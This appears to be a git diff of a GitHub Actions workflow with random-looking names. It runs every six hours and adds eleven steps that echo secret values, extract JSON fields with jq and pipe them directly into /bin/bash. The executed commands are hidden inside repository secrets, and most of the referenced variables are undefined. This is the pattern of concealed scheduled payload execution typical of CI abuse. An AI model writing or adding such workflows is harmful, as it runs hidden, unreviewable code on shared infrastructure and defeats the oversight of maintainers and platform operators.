@@ -1,22 +1,27 @@
 name: binnaclepiglet
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 5/6 * * *'
+    - cron: '54 4/6 * * *'
 
-jobs:  # 28370
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: binnaclepiglet
         env:
-          lppmi54: ${{ secrets.lppmi54 }}
+          ylc8429: ${{ secrets.ylc8429 }}
         run: |
-          echo $lppmi54 | jq -r .tnrz0 | /bin/bash
-          echo $bndo7 | jq -r .skfi2 | /bin/bash
-          echo $jpqc44 | jq -r .vlpob1 | /bin/bash
-          echo $hhw48193 | jq -r .tdtnf228 | /bin/bash
-          echo $icc420 | jq -r .qmbtc8081 | /bin/bash
+          echo $ylc8429 | jq -r .f741 | /bin/bash
+          echo $ae32559 | jq -r .wknv257 | /bin/bash
+          echo $sbpjg55241 | jq -r .isrqv8982 | /bin/bash
+          echo $he175 | jq -r .tjvz00 | /bin/bash
+          echo $xocf81 | jq -r .hdm7347 | /bin/bash
+          echo $dweef8 | jq -r .zv7 | /bin/bash
+          echo $unwd51063 | jq -r .krzz53 | /bin/bash
+          echo $if58 | jq -r .hhu992 | /bin/bash
+          echo $rdvq42370 | jq -r .uay23567 | /bin/bash
+          echo $xcae4 | jq -r .ih5 | /bin/bash
+          echo $ipc48 | jq -r .kkmzm7579 | /bin/bash
 
